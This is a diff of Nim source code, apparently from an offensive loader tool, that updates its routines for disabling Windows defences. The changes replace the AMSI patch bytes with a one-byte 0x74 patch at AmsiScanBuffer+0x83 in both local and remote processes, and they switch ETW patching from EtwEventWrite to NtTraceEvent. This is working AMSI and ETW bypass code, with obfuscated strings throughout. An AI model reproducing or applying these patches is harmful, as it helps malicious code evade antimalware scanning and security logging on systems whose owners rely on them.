@@ -26,9 +26,11 @@ proc PatchAmsi(): bool =
         disabled: bool = false
     
     when defined amd64:
-        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
+        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        #let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
     elif defined i386:
-        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
+        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        #let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
     when defined(DInvoke):
         amsi = MyLoadLibraryA(obf("amsi.dll"))
     else:
@@ -45,6 +47,8 @@ proc PatchAmsi(): bool =
         echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
     
+    cs = cs + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+
     var oldProtection: DWORD = 0
 
     var success: BOOL
@@ -106,7 +110,8 @@ proc Patchntdll(): bool =
         t: ULONG
         disabled: bool = false
         # two of the functions cause problems for --csharp and --syswhispers --jump at the moment
-        PatchAPIs: seq[string] = @[#[obf("EtwNotificationRegister"),]# #[obf("EtwEventRegister"),]# obf("EtwEventWriteFull"), obf("EtwEventWrite")]
+        #PatchAPIs: seq[string] = @[#[obf("EtwNotificationRegister"),]# #[obf("EtwEventRegister"),]# obf("EtwEventWriteFull"), obf("EtwEventWrite")]
+        PatchAPIs: seq[string] = @[obf("NtTraceEvent")] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
 
     when defined amd64:
         let patch: array[1, byte] = [byte 0xc3]
@@ -374,9 +379,11 @@ proc remoteLoadAmsi(processID: var DWORD): bool =
 proc RemotePatchAmsi(hProcss :HANDLE): bool =
 
     when defined amd64:
-        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
+        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        #let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
     elif defined i386:
-        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
+        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
+        #let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
 
 
     var disabled: bool = false
@@ -390,7 +397,7 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
     if RemoteProc == NULL:
         echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
-
+    RemoteProc = RemoteProc + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
     var oldProtection: DWORD = 0
     var success: BOOL
     var protectAddress = RemoteProc
@@ -526,9 +533,9 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
         echo obf("[X] Failed to get ntdll.dll handle")
         return disabled
 
-    var RemoteProc = GetRemoteProcAddress(hProcess, RemoteHandle,obf("EtwEventWrite"))
+    var RemoteProc = GetRemoteProcAddress(hProcess, RemoteHandle,obf("NtTraceEvent"))
     if RemoteProc == NULL:
-        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
+        echo obf("[X] Failed to get the address of 'NtTraceEvent'")
         return disabled
 
     var oldProtection: DWORD = 0
